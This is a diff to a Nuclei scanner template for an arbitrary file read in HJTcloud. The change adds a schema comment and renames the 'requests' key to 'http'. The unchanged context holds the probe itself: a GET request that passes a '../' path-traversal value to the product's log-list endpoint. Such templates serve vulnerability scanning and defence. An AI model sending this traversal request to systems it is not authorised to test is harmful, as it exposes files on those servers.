@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: hjtcloud-rest-arbitrary-file-read
 info:
   name: HJTcloud Arbitrary file read
@@ -6,7 +7,7 @@ info:
   reference:
     - https://mp.weixin.qq.com/s/w2pkj5ADN7b5uxe-wmfGbw
   tags: hjtcloud,lfi
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/him/api/rest/V1.0/system/log/list?filePath=../"
